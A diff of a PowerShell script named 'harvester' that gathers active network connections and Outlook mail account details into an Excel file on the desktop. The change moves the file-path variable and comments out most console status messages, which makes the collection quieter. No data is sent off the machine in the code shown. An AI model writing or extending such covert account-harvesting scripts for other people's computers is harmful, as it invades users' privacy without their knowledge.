@@ -1,4 +1,8 @@
-﻿# Get active network connections
+# Save to excel file
+$excelPath = "$env:USERPROFILE\Desktop\harvester.xlsx"
+ 
+ 
+# Get active network connections
 $connections = netstat -ano | Where-Object { $_ -match "LISTENING|ESTABLISHED" }
 
 # Create Excel COM object
@@ -52,7 +56,6 @@ foreach ($line in $connections) {
 }
 
 # Save Excel file
-$excelPath = "$env:USERPROFILE\Desktop\harvester.xlsx"
 $workbook.SaveAs($excelPath)
 $workbook.Close($true)
 $excel.Quit()
@@ -348,13 +351,13 @@ foreach ($acc in $session.Accounts) {
 [System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
 
 if ($accounts.Count -eq 0) {
-    Write-Host "No Outlook accounts found."
+    #Write-Host "No Outlook accounts found."
     exit
 }
 
 # === Open existing Excel file and add a new sheet ===
 if (-not (Test-Path $ExcelPath)) {
-    Write-Host "Excel file not found: $ExcelPath"
+    #Write-Host "Excel file not found: $ExcelPath"
     exit
 }
 
@@ -365,10 +368,10 @@ $workbook = $excel.Workbooks.Open($ExcelPath)
 # Check for existing sheet with same name
 try {
     $sheet = $workbook.Sheets.Item($NewSheetName)
-    Write-Host "Sheet '$NewSheetName' already exists. Overwriting."
+    #Write-Host "Sheet '$NewSheetName' already exists. Overwriting."
     $sheet.Delete()
 } catch {
-    Write-Host "Sheet '$NewSheetName' does not exist. Creating new."
+    #Write-Host "Sheet '$NewSheetName' does not exist. Creating new."
 }
 
 # Add new sheet
@@ -398,7 +401,6 @@ $sheet.Columns.AutoFit()
 $workbook.Save()
 $workbook.Close($true)
 $excel.Quit()
-Write-Host "Mail account data written to new sheet '$NewSheetName' in Excel file: $ExcelPath"
 
 
 
@@ -419,3 +421,4 @@ Write-Host "Mail account data written to new sheet '$NewSheetName' in Excel file
 
 # Confirmation
 Write-Host "saved to $excelPath"
+
